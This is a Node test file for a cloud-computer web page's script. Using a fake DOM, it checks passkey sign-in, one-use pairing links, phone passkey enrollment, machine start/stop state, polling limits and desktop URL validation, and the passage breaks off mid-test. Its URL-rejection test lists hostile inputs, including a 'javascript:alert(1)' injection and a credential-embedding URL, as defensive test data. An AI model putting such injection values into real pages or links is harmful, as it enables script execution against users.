// Cloudbite cloud computer page (src/cloudbite-computer-page.ts → CLOUDBITE_COMPUTER_JS) pinned without a browser: a small fake DOM
// in node:vm drives passkey sign-in (/api/cloudbite/computer/auth), the one-use #pair= link, phone passkey enrollment, the machine state machine, requestId reuse after uncertain answers, visible-only
// bounded polling, the desktop ticket URL check, the honest apps catalogue and the KO/EN switch.
// Real-browser and 390px visual checks are the coordinator's (Aside) — this file is not browser evidence.
//   node test/cloudbite-computer-ui.mjs
import assert from 'node:assert/strict';
import vm from 'node:vm';
import { webcrypto } from 'node:crypto';
import {
  CLOUDBITE_COMPUTER_JS, CLOUDBITE_COMPUTER_HTML, CLOUDBITE_COMPUTER_CSS, CLOUDBITE_COMPUTER_PATH, CLOUDBITE_COMPUTER_JS_PATH, CLOUDBITE_COMPUTER_CSS_PATH,
} from '../src/cloudbite-computer-page.ts';

let pass = 0;
const test = async (name, fn) => { await fn(); pass++; console.log(`  ok   ${name}`); };
const UUID = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/;
const GW = 'https://cloudbite-desktop.ai-gongbu.workers.dev';

class El {
  constructor(doc, tag) { this.doc = doc; this.tagName = tag.toUpperCase(); this.children = []; this.attrs = {}; this.listeners = {}; this.parent = null;
    this.className = ''; this._text = ''; this.value = ''; this.disabled = false; this.hidden = false; this.title = ''; this.id = ''; }
  get parentElement() { return this.parent; }
  get textContent() { return this._text + this.children.map(c => typeof c === 'string' ? c : c.textContent).join(''); }
  set textContent(v) { for (const c of this.children) if (typeof c !== 'string') c.parent = null; this.children = []; this._text = String(v); }
  setAttribute(k, v) { this.attrs[k] = String(v); }
  getAttribute(k) { return k in this.attrs ? this.attrs[k] : null; }
  addEventListener(t, f) { (this.listeners[t] ||= []).push(f); }
  dispatch(t) { for (const f of this.listeners[t] || []) f({ type: t, target: this, preventDefault() {} }); }
  append(...ns) { for (const n of ns) { if (typeof n === 'string') { this.children.push(n); continue; } if (n.parent) n.remove(); n.parent = this; this.children.push(n); } }
  replaceChildren(...ns) { for (const c of this.children) if (typeof c !== 'string') c.parent = null; this.children = []; this._text = ''; this.append(...ns); }
  remove() { if (this.parent) { this.parent.children = this.parent.children.filter(c => c !== this); this.parent = null; } }
  click() { if (!this.disabled) this.dispatch('click'); }
  *walk() { for (const c of this.children) if (typeof c !== 'string') { yield c; yield* c.walk(); } }
  shown() { let n = this; while (n) { if (n.hidden) return false; n = n.parent; } return true; }
}

const json = (status, body) => Promise.resolve({ ok: status >= 200 && status < 300, status, json: async () => body });
const state = (o = {}) => ({ ok: true, status: 'absent', error: null, machine: null, sessionEndsAt: null, snapshot: null, ready: false,
  configuredAccounts: [{ id: 'primary', label: 'Primary', available: true }, { id: 'secondary', label: 'Secondary', available: false }], ...o });
const MACHINE = { id: 'sb-1', name: 'cloudbite-computer-owner', account: 'primary', region: 'us', cpu: 4, memoryGiB: 8, diskGiB: 10 };

// The page's clock is a fake Date that advances only with e.advance(), so countdowns and deadlines are exact in tests.
const T0 = Date.parse('2026-10-19T03:00:00Z');
function env({ route, language = 'en-US', search = '', hash = '', webauthn = true, create = async () => attestation() } = {}) {
  const timers = new Map(); let seq = 0, now = 0;
  class FakeDate extends Date { constructor(...a) { if (a.length) super(...a); else super(T0 + now); } static now() { return T0 + now; } }
  const doc = { activeElement: null, title: '', documentElement: { lang: 'en' }, visibilityState: 'visible', listeners: {},
    createElement: (t) => new El(doc, t), getElementById: (id) => (id === 'cb-computer' ? root : null),
    addEventListener(t, f) { (this.listeners[t] ||= []).push(f); } };
  const root = new El(doc, 'div');
  doc.body = new El(doc, 'body'); doc.body.append(root);
  const requests = [], gets = [], creates = [], replaced = [], windowListeners = {};
  const location = { pathname: CLOUDBITE_COMPUTER_PATH, search, hash };
  const history = { state: null, replaceState(st, t, url) { replaced.push({ url, requests: requests.length, rendered: root.children.length, hashAtCall: location.hash }); location.hash = ''; } };
  const ctx = vm.createContext({
    document: doc, location, history, URLSearchParams, URL, atob, btoa, Date: FakeDate, Uint8Array, ArrayBuffer, AbortController,
    addEventListener(t, f) { (windowListeners[t] ||= []).push(f); },
    crypto: webcrypto,
    navigator: { language, credentials: { get: async (o) => { gets.push(o); return assertion(); }, create: async (o) => { creates.push(o); return create(o); } } },
    ...(webauthn ? { PublicKeyCredential: function PublicKeyCredential() {} } : {}),
    setTimeout: (fn, ms) => { const id = ++seq; timers.set(id, { at: now + (ms || 0), fn }); return id; },
    clearTimeout: (id) => { timers.delete(id); },
    fetch: (url, init = {}) => { const r = { url, method: init.method || 'GET', body: init.body === undefined ? undefined : JSON.parse(init.body), init, hash: location.hash }; requests.push(r); return route(r, requests); },
  });
  const flush = async () => { for (let i = 0; i < 30; i++) await new Promise(r => setImmediate(r)); };
  const advance = async (ms) => {
    const end = now + ms;
    for (;;) {
      const due = [...timers.entries()].filter(([, t]) => t.at <= end).sort((a, b) => a[1].at - b[1].at)[0];
      if (!due) break;
      timers.delete(due[0]); now = due[1].at; due[1].fn(); await flush();
    }
    now = end;
  };
  vm.runInContext(CLOUDBITE_COMPUTER_JS, ctx);
  const all = () => [...root.walk()];
  const visible = () => all().filter(e => e.shown());
  const btn = (text) => visible().find(e => e.tagName === 'BUTTON' && e.textContent === text);
  const links = () => visible().filter(e => e.tagName === 'A');
  const setVisibility = (v) => { doc.visibilityState = v; for (const f of doc.listeners.visibilitychange || []) f(); };
  const network = (online) => { for (const f of windowListeners[online ? 'online' : 'offline'] || []) f(); };
  return { doc, root, requests, gets, creates, replaced, location, timers, flush, advance, all, visible, btn, links, setVisibility, network, now: () => T0 + now,
    text: () => visible().map(e => e._text + e.children.filter(c => typeof c === 'string').join('')).filter(Boolean).join(' | '),
    posts: (p) => requests.filter(r => r.method === 'POST' && r.url === p) };
}

function assertion() {
  const b = (n) => new Uint8Array(n).fill(7).buffer;
  return { id: 'cred', rawId: b(8), type: 'public-key', response: { clientDataJSON: b(4), authenticatorData: b(4), signature: b(4), userHandle: null }, getClientExtensionResults: () => ({}) };
}

function attestation() {
  const b = (n, v) => new Uint8Array(n).fill(v).buffer;
  return { id: 'phone-cred', rawId: b(16, 9), type: 'public-key', authenticatorAttachment: 'platform',
    response: { clientDataJSON: b(5, 1), attestationObject: b(6, 2), getTransports: () => ['internal', 'hybrid'] }, getClientExtensionResults: () => ({ credProps: { rk: true } }) };
}
const b64u = (bytes) => Buffer.from(bytes).toString('base64url');
const bytesOf = (buf) => [...new Uint8Array(buf)];
/** a fresh random setup token per run (32 bytes, base64url) — no fixed example token in this file */
const freshToken = () => b64u(webcrypto.getRandomValues(new Uint8Array(32)));
const AUTH = '/api/cloudbite/computer/auth';

/** signed in + a mutable server state */
function owned(initial, handlers = {}) {
  const s = { cur: initial, hasCredentials: true };
  const route = (r, all) => {
    if (r.url === `${AUTH}/session`) return json(200, { authenticated: !s.unauth, hasCredentials: s.hasCredentials });
    if (s.unauth && r.url.startsWith('/api/cloudbite/computer/')) return json(401, { error: { code: 'unauthorized', message: 'x' } });
    if (r.url === '/api/cloudbite/computer/state') return json(200, s.cur);
    const k = r.url.replace('/api/cloudbite/computer/', '');
    if (handlers[k]) return handlers[k](r, s, all);
    return json(404, { error: { code: 'not_found', message: 'x' } });
  };
  return { s, route };
}

console.log('cloudbite computer page');

await test('static page: same-origin script and style only, no inline code, no storage, no CDN fonts', async () => {
  assert.equal(CLOUDBITE_COMPUTER_PATH, '/cloudbite/computer');
  assert.ok(CLOUDBITE_COMPUTER_HTML.includes(`<script src="${CLOUDBITE_COMPUTER_JS_PATH}" defer></script>`));
  assert.ok(CLOUDBITE_COMPUTER_HTML.includes(`<link rel="stylesheet" href="${CLOUDBITE_COMPUTER_CSS_PATH}">`));
  assert.ok(!/<script>(?!<)|style=|<iframe|https?:\/\//.test(CLOUDBITE_COMPUTER_HTML.replace(/<script src[^>]+><\/script>/, '')));
  assert.ok(!/localStorage|sessionStorage|indexedDB|document\.cookie|innerHTML|eval\(|<iframe/.test(CLOUDBITE_COMPUTER_JS));
  const urls = [...new Set(CLOUDBITE_COMPUTER_JS.match(/https?:\/\/[^'"`\s]+/g))].sort();
  assert.deepEqual(urls, [GW, 'https://k.shinick.dev/borrow', 'https://k.shinick.dev/vault']);
  assert.ok(!/@import|url\(\s*['"]?https?:|fonts\.googleapis/i.test(CLOUDBITE_COMPUTER_CSS));
});

await test('CSS stays inside a 390px viewport: no fixed widths over 360px outside media queries, 48px touch targets', async () => {
  const base = CLOUDBITE_COMPUTER_CSS.split('@media')[0];
  for (const m of base.matchAll(/(?:^|[;{])\s*(?:width|min-width)\s*:\s*(\d+)px/g)) assert.ok(Number(m[1]) <= 360, `fixed width ${m[0]}`);
  for (const m of base.matchAll(/minmax\((\d+)px/g)) assert.ok(Number(m[1]) <= 180, m[0]);
  assert.match(CLOUDBITE_COMPUTER_CSS, /\.cc-btn\{min-height:48px/);
  assert.match(CLOUDBITE_COMPUTER_CSS, /\.cc-select,\.cc-input\{[^}]*font-size:16px/); // no iOS zoom on focus
});

await test('signed out with a registered key: sign-in offered, no machine call, nothing started', async () => {
  const e = env({ route: (r) => r.url === `${AUTH}/session` ? json(200, { authenticated: false, hasCredentials: true }) : json(500, {}) });
  await e.flush();
  assert.ok(e.btn('Sign in with passkey'));
  assert.equal(e.requests.filter(r => r.url.startsWith('/api/cloudbite/computer') && !r.url.startsWith(AUTH)).length, 0);
  assert.ok(e.links().some(a => a.getAttribute('href') === '/cloudbite'), 'expert workbench link kept');
});

await test('no key registered: points to the owner setup page instead of a sign-in button', async () => {
  const e = env({ route: () => json(200, { authenticated: false, hasCredentials: false }) });
  await e.flush();
  assert.equal(e.btn('Sign in with passkey'), undefined);
  assert.ok(e.links().some(a => a.getAttribute('href') === '/cloudbite/requests'));
});

await test('passkey login on the computer auth path: options → navigator.credentials.get → login, then loads state (cookie only)', async () => {
  let authed = false;
  const e = env({ route: (r) => {
    if (r.url === `${AUTH}/session`) return json(200, { authenticated: authed, hasCredentials: true });
    if (r.url === `${AUTH}/options`) return json(200, { challenge: 'AAAA', allowCredentials: [{ id: 'AQID', type: 'public-key' }] });
    if (r.url === `${AUTH}/login`) { authed = true; return json(200, { authenticated: true, hasCredentials: true }); }
    if (r.url === '/api/cloudbite/computer/state') return json(200, state());
    return json(404, {});
  } });
  await e.flush();
  e.btn('Sign in with passkey').click(); await e.flush();
  assert.equal(e.gets.length, 1);
  const login = e.posts(`${AUTH}/login`)[0];
  assert.equal(login.body.response.id, 'cred');
  assert.equal(e.requests.filter(r => r.url.startsWith('/api/cloudbite/owner')).length, 0, 'no owner API from this page');
  assert.equal(e.creates.length, 0, 'login never creates a credential');
  assert.ok(e.requests.every(r => r.init.credentials === 'same-origin'));
  assert.ok(e.requests.some(r => r.url === '/api/cloudbite/computer/state'));
  assert.ok(e.btn('Start machine'));
});

await test('absent: never auto-provisions; Start sends a UUID requestId and the chosen available account', async () => {
  const { route } = owned(state(), { start: (r, s) => { s.cur = state({ status: 'starting', machine: MACHINE }); return json(200, { ok: true }); } });
  const e = env({ route });
  await e.flush(); await e.advance(60000);
  assert.equal(e.posts('/api/cloudbite/computer/start').length, 0, 'no start without a tap');
  assert.match(e.text(), /No machine yet/);
  e.btn('Start machine').click(); await e.flush();
  const [p] = e.posts('/api/cloudbite/computer/start');
  assert.match(p.body.requestId, UUID);
  assert.deepEqual(Object.keys(p.body).sort(), ['account', 'requestId']);
  assert.equal(p.body.account, 'primary');
  assert.match(e.text(), /Starting/);
});

await test('uncertain answer keeps the same requestId for retry; a definite answer clears it', async () => {
  let n = 0;
  const { route } = owned(state(), { start: (r, s) => { n++; if (n === 1) return Promise.reject(new Error('lost')); if (n === 2) return json(503, { error: { code: 'upstream_unavailable', message: 'x' } }); s.cur = state({ status: 'starting', machine: MACHINE }); return json(200, { ok: true }); } });
  const e = env({ route });
  await e.flush();
  e.btn('Start machine').click(); await e.flush();
  assert.match(e.text(), /No definite answer/);
  assert.equal(e.btn('Start machine').disabled, true, 'no second request while one is uncertain');
  e.btn('Retry same request').click(); await e.flush();
  e.btn('Retry same request').click(); await e.flush();
  const ids = e.posts('/api/cloudbite/computer/start').map(r => r.body.requestId);
  assert.equal(ids.length, 3);
  assert.equal(new Set(ids).size, 1, 'same requestId every time');
  assert.equal(e.btn('Retry same request'), undefined);
  assert.match(e.text(), /Start accepted/);
});

await test('definite rejection shows the safe code and does not retry', async () => {
  const { route } = owned(state(), { start: () => json(409, { error: { code: 'account_unavailable', message: 'nope' } }) });
  const e = env({ route });
  await e.flush();
  e.btn('Start machine').click(); await e.flush(); await e.advance(30000);
  assert.equal(e.posts('/api/cloudbite/computer/start').length, 1);
  assert.match(e.text(), /Rejected: account_unavailable/);
  assert.ok(!/nope/.test(e.text()), 'server message text is not echoed');
});

await test('polling: only while visible and pending, bounded, stops once running and ready', async () => {
  const { s, route } = owned(state({ status: 'starting', machine: MACHINE }));
  const e = env({ route });
  await e.flush();
  const count = () => e.requests.filter(r => r.url === '/api/cloudbite/computer/state').length;
  await e.advance(3000); assert.equal(count(), 2);
  e.setVisibility('hidden'); await e.flush();
  await e.advance(60000); assert.equal(count(), 2, 'no polling while hidden');
  e.setVisibility('visible'); await e.flush(); assert.equal(count(), 3, 'one refresh on return');
  await e.advance(30 * 60 * 1000);
  const bounded = count();
  assert.ok(bounded <= 3 + 90 && bounded > 20, `bounded polls (${bounded})`);
  await e.advance(10 * 60 * 1000); assert.equal(count(), bounded, 'stops at the bound');
  s.cur = state({ status: 'running', machine: MACHINE, ready: true });
  e.btn('Refresh').click(); await e.flush();
  const after = count();
  await e.advance(120000); assert.equal(count(), after, 'running and ready: no polling');
});

await test('running: open asks for a ticket and only accepts the separate desktop gateway URL', async () => {
  let url = `${GW}/p/_cloudbite/computer/desktop/?t=abc`;
  const ends = new Date(T0 + 47 * 60000).toISOString();
  const { route } = owned(state({ status: 'running', machine: MACHINE, ready: true, sessionEndsAt: ends }), { launch: () => json(200, { ok: true, url }) });
  const e = env({ route });
  await e.flush();
  assert.match(e.text(), /4 vCPU · 8 GiB RAM · 10 GiB disk/);
  assert.match(e.text(), /\(47 min left\)\. The machine then stops; files on disk are kept\./);
  assert.match(e.text(), /does not guarantee a price/);
  e.btn('Open desktop').click(); await e.flush();
  assert.deepEqual(e.posts('/api/cloudbite/computer/launch')[0].body, {});
  const a = e.links().find(x => x.textContent === 'Open the desktop');
  assert.equal(a.getAttribute('href'), url);
  assert.equal(a.getAttribute('rel'), 'noopener noreferrer');
  a.click(); await e.advance(1);
  assert.equal(e.links().find(x => x.textContent === 'Open the desktop'), undefined, 'single-use ticket is dropped after use');
  for (const bad of ['https://cloudbite.shinick.dev/p/_cloudbite/computer/desktop/', `${GW}/api/cloudbite/computer/state`, `${GW}/p/_cloudbite/computer/desktopx/`, `http://cloudbite-v001.ai-gongbu.workers.dev/p/_cloudbite/computer/desktop/`,'javascript:alert(1)', `https://u:p@cloudbite-v001.ai-gongbu.workers.dev/p/_cloudbite/computer/desktop/`]) {
    url = bad;
    e.btn('Open desktop').click(); await e.flush();
    assert.equal(e.links().find(x => x.textContent === 'Open the desktop'), undefined, bad);
    assert.match(e.text(), /unexpected desktop address/);
  }
});

await test('running but not ready: Open stays disabled; Stop and Extend send only requestId', async () => {
  const { route } = owned(state({ status: 'running', machine: MACHINE, ready: false }), { stop: () => json(200, { ok: true }), extend: () => json(200, { ok: true }) });
  const e = env({ route });
  await e.flush();
  assert.equal(e.btn('Open desktop').disabled, true);
  e.btn('Extend session').click(); await e.flush();
  e.btn('Stop').click(); await e.flush();
  for (const k of ['stop', 'extend']) { const [p] = e.posts(`/api/cloudbite/computer/${k}`); assert.deepEqual(Object.keys(p.body), ['requestId']); assert.match(p.body.requestId, UUID); }
  assert.notEqual(e.posts('/api/cloudbite/computer/stop')[0].body.requestId, e.posts('/api/cloudbite/computer/extend')[0].body.requestId);
});

await test('stopped: Resume uses the machine account; an unavailable account is never switched', async () => {
  const { s, route } = owned(state({ status: 'stopped', machine: { ...MACHINE, account: 'secondary' } }), { start: () => json(200, { ok: true }) });
  const e = env({ route });
  await e.flush();
  assert.equal(e.btn('Resume').disabled, true);
  assert.match(e.text(), /will not switch accounts/);
  assert.match(e.text(), /Files, installed tools and the browser profile are kept/);
  s.cur = state({ status: 'stopped', machine: MACHINE });
  e.btn('Refresh').click(); await e.flush();
  e.btn('Resume').click(); await e.flush();
  assert.equal(e.posts('/api/cloudbite/computer/start')[0].body.account, 'primary');
});

await test('snapshot: warns about disk credentials and no RAM, validates the name, sends {requestId,name}', async () => {
  const { route } = owned(state({ status: 'stopped', machine: MACHINE, snapshot: { name: 'old-env', state: 'ready', error: null } }), { snapshot: () => json(202, { ok: true }) });
  const e = env({ route });
  await e.flush();
  assert.match(e.text(), /including credentials/);
  assert.match(e.text(), /memory \(RAM\) are not saved/);
  assert.match(e.text(), /never offered as a download/);
  assert.match(e.text(), /Last snapshot: old-env — ready/);
  const input = e.visible().find(x => x.tagName === 'INPUT');
  input.value = 'Bad Name!'; input.dispatch('input');
  e.btn('Save environment').click(); await e.flush();
  assert.equal(e.posts('/api/cloudbite/computer/snapshot').length, 0);
  assert.match(e.text(), /Use 3–48 lowercase/);
  input.value = 'my-env-1'; input.dispatch('input');
  e.btn('Save environment').click(); await e.flush();
  const [p] = e.posts('/api/cloudbite/computer/snapshot');
  assert.equal(p.body.name, 'my-env-1'); assert.match(p.body.requestId, UUID);
});

await test('apps: all 14 services listed; nothing claims signed-in or installed without server state', async () => {
  const { s, route } = owned(state({ status: 'running', machine: MACHINE, ready: true }));
  const e = env({ route });
  await e.flush();
  const cards = () => e.visible().filter(x => x.getAttribute('data-tool'));
  assert.deepEqual(cards().map(c => c.getAttribute('data-tool')),
    ['claude', 'codex', 'cursor', 'grok', 'antigravity', 'opencode', 'openrouter', 'genspark', 'lovable', 'tavily', 'elevenlabs', 'nebius', 'daytona', 'nosana']);
  const yes = () => e.visible().filter(x => /cc-ind-yes/.test(x.className));
  assert.equal(yes().length, 0);
  assert.ok(!/\bready\b/i.test(cards().map(c => c.textContent).join(' ')), 'no blanket ready claim');
  const card = (id) => cards().find(c => c.getAttribute('data-tool') === id);
  assert.match(card('genspark').textContent, /Web in desktop browser/);
  assert.ok(!/API key|installed/i.test(card('genspark').textContent));
  assert.match(card('claude').textContent, /CLI installed: Not reported/);
  assert.match(e.text(), /Install status comes from the running machine/);
  // rows as the image worker's computerToolCatalog(probe) emits them
  const row = (id, kind, status, version = null) => ({ id, label: id, kind, auth: 'x', url: 'https://example.invalid/', command: null, pinned: null, status, version, note: '' });
  s.cur = state({ status: 'running', machine: MACHINE, ready: true, tools: [
    row('claude-code', 'native_cli', 'installed', '2.1.302'), row('codex', 'native_cli', 'not_installed'), row('cursor-agent', 'native_cli', 'unprobed'),
    row('opencode', 'native_cli', 'installed', '1.19.3'), row('grok', 'web', 'web'), row('genspark', 'web', 'web'), row('tavily', 'api_broker', 'api_broker'),
    row('openrouter', 'web', 'web'), row('openrouter-api', 'api_broker', 'api_broker'), row('claude-web', 'web', 'web'),
  ] });
  e.btn('Refresh').click(); await e.flush();
  assert.match(card('claude').textContent, /CLI installed · 2\.1\.302/);
  assert.match(card('claude').textContent, /Web launcher on desktop/);
  assert.match(card('codex').textContent, /CLI not installed/);
  assert.match(card('cursor').textContent, /CLI not checked yet/);
  assert.match(card('antigravity').textContent, /CLI not in image/);
  assert.match(card('tavily').textContent, /Key via broker — not checked/);
  assert.match(card('openrouter').textContent, /Web launcher on desktop.*Key via broker/);
  assert.ok(!/Signed in/.test(cards().map(c => c.textContent).join(' ')), 'sign-in is never inferred');
  assert.match(e.text(), /Sign-in happens in the desktop and is not tracked here/);
  assert.equal(yes().length, 2, 'only the two probed-installed CLIs are green');
  s.cur = state({ status: 'running', machine: MACHINE, ready: true, tools: [{ id: 'tavily', status: 'api_broker', connected: true }] });
  e.btn('Refresh').click(); await e.flush();
  assert.match(card('tavily').textContent, /Signed in \/ key set/, 'an explicit server flag is shown');
});

await test('nested compute: configure sends {requestId} only while running; jobs list shows server rows', async () => {
  let jobs = { ok: true, jobs: [] };
  const { s, route } = owned(state({ status: 'stopped', machine: MACHINE }), { 'nested/configure': () => json(200, { ok: true }), 'nested/jobs': () => json(200, jobs) });
  const e = env({ route });
  await e.flush();
  assert.equal(e.btn('Set up nested compute').disabled, true);
  s.cur = state({ status: 'running', machine: MACHINE, ready: true });
  e.btn('Refresh').click(); await e.flush();
  e.btn('Set up nested compute').click(); await e.flush();
  const [p] = e.posts('/api/cloudbite/computer/nested/configure');
  assert.deepEqual(Object.keys(p.body), ['requestId']); assert.match(p.body.requestId, UUID);
  assert.match(e.text(), /Nested compute setup accepted/);
  e.btn('Show nested jobs').click(); await e.flush();
  assert.match(e.text(), /reports no nested jobs/);
  jobs = { ok: true, jobs: [{ id: 'job-1', provider: 'nosana', status: 'running' }] };
  e.btn('Show nested jobs').click(); await e.flush();
  assert.match(e.text(), /nosana · job-1 · running/);
});

await test('broker and vault open on this phone (no QR), terminal help explains the remote keyboard', async () => {
  const { route } = owned(state());
  const e = env({ route });
  await e.flush();
  const hrefs = e.links().map(a => a.getAttribute('href'));
  assert.ok(hrefs.includes('https://k.shinick.dev/borrow') && hrefs.includes('https://k.shinick.dev/vault'));
  assert.match(e.text(), /no QR code or second device needed/);
  const t = e.btn('How to type on the remote desktop');
  assert.equal(t.getAttribute('aria-expanded'), 'false');
  t.click();
  assert.equal(t.getAttribute('aria-expanded'), 'true');
  assert.match(e.text(), /never on this phone/);
  assert.match(e.text(), /on-screen keyboard/);
});

await test('KO/EN switch keeps state and typed snapshot name; 401 returns to sign-in', async () => {
  const { s, route } = owned(state({ status: 'stopped', machine: MACHINE }));
  const e = env({ route, language: 'ko-KR' });
  await e.flush();
  assert.equal(e.doc.documentElement.lang, 'ko');
  assert.match(e.text(), /중지됨/);
  const input = e.visible().find(x => x.tagName === 'INPUT');
  input.value = 'keep-me'; input.dispatch('input');
  e.btn('EN').click();
  assert.equal(e.doc.documentElement.lang, 'en');
  assert.equal(input.value, 'keep-me');
  assert.ok(e.btn('Resume'));
  s.unauth = true;
  e.btn('Refresh').click(); await e.flush();
  assert.ok(e.btn('Sign in with passkey'), 'expired cookie → sign-in again');
  assert.equal(e.btn('Resume'), undefined);
});

/** a phone opening the one-use setup link: session is the cookie the root sets on a successful pair */
function pairing(pairReply, extra = {}) {
  const { s, route: base } = owned(state(), extra);
  s.unauth = true; s.hasCredentials = false;
  const route = (r, all) => {
    if (r.url === `${AUTH}/pair`) return pairReply(r, s);
    return base(r, all);
  };
  return { s, route };
}

await test('#pair= link: hash cleared before any render or fetch, token POSTed once, then this phone\'s passkey is offered', async () => {
  const token = freshToken();
  const { route } = pairing((r, s) => { s.unauth = false; return json(200, { authenticated: true, hasCredentials: false }); });
  const e = env({ route, hash: `#pair=${token}` });
  assert.equal(e.replaced.length, 1);
  assert.deepEqual({ ...e.replaced[0], hashAtCall: e.replaced[0].hashAtCall.startsWith('#pair=') }, { url: CLOUDBITE_COMPUTER_PATH, requests: 0, rendered: 0, hashAtCall: true }, 'stripped before render or fetch');
  assert.ok(!e.replaced[0].url.includes(token));
  assert.equal(e.location.hash, '');
  await e.flush(); await e.advance(60000);
  const pairs = e.posts(`${AUTH}/pair`);
  assert.equal(pairs.length, 1, 'one-use link sent exactly once');
  assert.deepEqual(pairs[0].body, { token });
  assert.ok(e.requests.every(r => r.hash === ''), 'no request leaves while the token is in the URL');
  assert.ok(e.requests.every(r => !r.url.includes(token)), 'token never in a URL or query');
  assert.equal(e.requests.filter(r => r.body && JSON.stringify(r.body).includes(token)).length, 1, 'token only in the pair body');
  assert.match(e.text(), /signed in to this cloud computer only/);
  const reg = e.btn('Register this phone\'s passkey');
  assert.ok(reg && !reg.disabled, 'enrollment available although hasCredentials is false');
  assert.equal(e.creates.length + e.gets.length, 0, 'no WebAuthn without a tap');
  assert.equal(e.posts('/api/cloudbite/computer/start').length, 0, 'pairing never provisions a machine');
  assert.ok(e.btn('Start machine'), 'the user still has to press Start');
  assert.equal(e.visible().filter(x => /cc-ind-yes/.test(x.className)).length, 0, 'phone sign-in marks no API tool as signed in');
  assert.ok(!/Signed in \/ key set/.test(e.text()));
});

await test('#pair= expired or malformed: reported honestly, never retried, normal passkey sign-in stays available', async () => {
  const { s, route } = pairing(() => json(410, { error: { code: 'pair_expired', message: 'x' } }));
  s.hasCredentials = true;
  const e = env({ route, hash: `#pair=${freshToken()}` });
  await e.flush(); await e.advance(60000);
  assert.equal(e.posts(`${AUTH}/pair`).length, 1);
  assert.match(e.text(), /expired or was already used \(pair_expired\)/);
  assert.equal(e.posts('/api/cloudbite/computer/start').length + e.requests.filter(r => r.url === '/api/cloudbite/computer/state').length, 0, 'no machine call');
  assert.equal(e.btn('Sign in with passkey').disabled, false, 'normal passkey login still offered');
  for (const bad of ['short', `${freshToken()}x`, `${freshToken().slice(0, 42)}=`, `cb_${freshToken().slice(0, 42)}B`]) {
    const { route: r2 } = pairing(() => json(200, { authenticated: true }));
    const f = env({ route: r2, hash: `#pair=${bad}` });
    await f.flush();
    assert.equal(f.location.hash, '', 'malformed link is still removed from the URL');
    assert.equal(f.posts(`${AUTH}/pair`).length, 0, `not sent: ${bad.length} chars`);
    assert.match(f.text(), /setup link is not valid/);
  }
  const ok = pairing((r, s) => { s.unauth = false; return json(200, { authenticated: true, hasCredentials: true }); });
  const g = env({ route: ok.route, hash: `#pair=cbpair_${freshToken()}` });
  await g.flush();
  assert.equal(g.posts(`${AUTH}/pair`).length, 1, 'short prefix accepted');
});

await test('#pair= lost answer: reconciled with one GET session, the token is never resent', async () => {
  for (const paired of [false, true]) {
    const { route } = pairing((r, s) => { if (paired) s.unauth = false; return Promise.reject(new Error('lost')); });
    const e = env({ route, hash: `#pair=${freshToken()}` });
    await e.flush(); await e.advance(60000);
    assert.equal(e.posts(`${AUTH}/pair`).length, 1);
    const pairAt = e.requests.findIndex(r => r.url === `${AUTH}/pair`);
    assert.equal(e.requests.slice(pairAt).filter(r => r.url === `${AUTH}/session`).length, 1, 'one reconcile');
    if (paired) assert.ok(e.btn('Register this phone\'s passkey'), 'session says signed in → enrollment offered');
    else { assert.match(e.text(), /Could not confirm the setup link/); assert.equal(e.btn('Register this phone\'s passkey'), undefined); }
  }
});

await test('enrollment: create gets decoded bytes; verify gets the serialized credential; success only after server verify', async () => {
  const challenge = [1, 2, 3, 250, 251], userId = [9, 8, 7], excl = [4, 4, 4, 4];
  let verify = () => json(200, { registered: true });
  const { route } = owned(state({ status: 'stopped', machine: MACHINE }), {
    'auth/register/options': () => json(200, { publicKey: { challenge: b64u(challenge), rp: { name: 'Cloudbite' }, user: { id: b64u(userId), name: 'owner', displayName: 'Owner' },
      pubKeyCredParams: [{ type: 'public-key', alg: -7 }], excludeCredentials: [{ id: b64u(excl), type: 'public-key' }], authenticatorSelection: { residentKey: 'required', userVerification: 'required' } } }),
    'auth/register/verify': (r) => verify(r),
  });
  const e = env({ route });
  await e.flush(); await e.advance(30000);
  assert.equal(e.creates.length, 0, 'nothing created on load');
  const btn = e.btn('Add this phone\'s passkey');
  assert.ok(btn, 'existing credentials: offered as an additional passkey');
  btn.click(); btn.click(); await e.flush();
  assert.equal(e.posts(`${AUTH}/register/options`).length, 1, 'double tap starts one ceremony');
  const pk = e.creates[0].publicKey;
  assert.deepEqual(bytesOf(pk.challenge), challenge);
  assert.deepEqual(bytesOf(pk.user.id), userId);
  assert.equal(pk.user.name, 'owner');
  assert.deepEqual(bytesOf(pk.excludeCredentials[0].id), excl);
  assert.equal(pk.authenticatorSelection.userVerification, 'required');
  const [v] = e.posts(`${AUTH}/register/verify`);
  assert.deepEqual(v.body, { response: { id: 'phone-cred', rawId: b64u(new Uint8Array(16).fill(9)), type: 'public-key',
    response: { attestationObject: b64u(new Uint8Array(6).fill(2)), clientDataJSON: b64u(new Uint8Array(5).fill(1)), transports: ['internal', 'hybrid'] },
    clientExtensionResults: { credProps: { rk: true } }, authenticatorAttachment: 'platform' } });
  assert.match(e.text(), /Passkey saved for this phone/);
  for (const [reply, re] of [[() => json(200, { ok: true }), /did not confirm the passkey/], [() => Promise.reject(new Error('lost')), /did not confirm the passkey/],
    [() => json(400, { error: { code: 'attestation_invalid', message: 'x' } }), /not saved\. Rejected: attestation_invalid/]]) {
    verify = reply;
    e.btn('Add this phone\'s passkey').click(); await e.flush();
    assert.match(e.text(), re);
    assert.ok(!/Passkey saved/.test(e.text()), 'never claims registered without a verified answer');
  }
});

await test('enrollment cancelled or refused: machine state untouched, localized message, no machine request', async () => {
  for (const [name, re, lang] of [['NotAllowedError', /패스키 설정을 취소했습니다/, 'ko-KR'], ['InvalidStateError', /already has a Cloudbite passkey/, 'en-US'], ['UnknownError', /did not create a passkey/, 'en-US']]) {
    const { route } = owned(state({ status: 'stopped', machine: MACHINE }), {
      'auth/register/options': () => json(200, { challenge: b64u([1]), user: { id: b64u([2]), name: 'o', displayName: 'o' }, pubKeyCredParams: [] }),
    });
    const e = env({ route, language: lang, create: async () => { throw Object.assign(new Error('x'), { name }); } });
    await e.flush();
    const before = e.requests.filter(r => r.url.startsWith('/api/cloudbite/computer/') && !r.url.startsWith(AUTH)).length;
    e.btn(lang === 'ko-KR' ? '이 휴대폰의 패스키 추가' : 'Add this phone\'s passkey').click(); await e.flush();
    assert.match(e.text(), re);
    assert.equal(e.posts(`${AUTH}/register/verify`).length, 0);
    assert.equal(e.requests.filter(r => r.url.startsWith('/api/cloudbite/computer/') && !r.url.startsWith(AUTH)).length, before, 'no machine call');
    assert.match(e.text(), lang === 'ko-KR' ? /중지됨/ : /Stopped/);
